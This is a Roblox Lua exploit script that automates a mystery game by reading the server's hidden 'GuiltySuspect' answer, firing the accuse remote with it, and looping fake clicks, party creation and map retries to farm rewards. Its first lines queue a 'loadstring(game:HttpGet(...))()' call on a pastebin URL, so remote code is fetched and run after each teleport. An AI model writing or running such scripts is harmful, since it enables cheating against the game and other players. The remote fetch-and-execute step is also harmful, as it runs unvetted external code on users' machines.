local pastebin = "https://pastebin.com/raw/gDkEPKSc"

if queue_on_teleport then
	queue_on_teleport(('loadstring(game:HttpGet("%s"))()'):format(pastebin))
end

local function waitForValidSuspect(Values)
	local suspect = Values:WaitForChild("GuiltySuspect")
	repeat task.wait() until suspect.Value and suspect.Value ~= ""
	return suspect.Value
end

local function doAction(label)
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local Values = ReplicatedStorage:WaitForChild("Values")
	local AccuseRemote = ReplicatedStorage:WaitForChild("Events"):WaitForChild("AccuseSuspect")

	local suspectValue = waitForValidSuspect(Values)
	AccuseRemote:FireServer(suspectValue)
	task.wait(10)

	local args = {1, "Cursed Cathedral", "Friends"}
	ReplicatedStorage:WaitForChild("Events"):WaitForChild("CreateParty"):FireServer(unpack(args))
	ReplicatedStorage:WaitForChild("Events"):WaitForChild("RetryMap"):FireServer()
end

local function clickMenuAndAccuse(label)
	local player = game:GetService("Players").LocalPlayer
	local vim = game:GetService("VirtualInputManager")
	local camera = workspace.CurrentCamera
	local viewport = camera.ViewportSize
	local x, y = viewport.X * 0.5, viewport.Y * 0.84
	vim:SendMouseButtonEvent(x, y, 0, true, game, 0)
	task.wait()
	vim:SendMouseButtonEvent(x, y, 0, false, game, 0)
	task.wait(2)
	doAction(label)
end

local function run()
	repeat task.wait() until game:IsLoaded()
	task.wait(2)
	local player = game:GetService("Players").LocalPlayer
	local label = player:WaitForChild("PlayerGui"):WaitForChild("MainGui").Holder.Top.Holder.Candy.Amount
	task.spawn(function()
		while task.wait(0.5) do
			local menuGui = player.PlayerGui:FindFirstChild("MenuGui")
			if menuGui then
				clickMenuAndAccuse(label)
			end
		end
	end)
end

run()
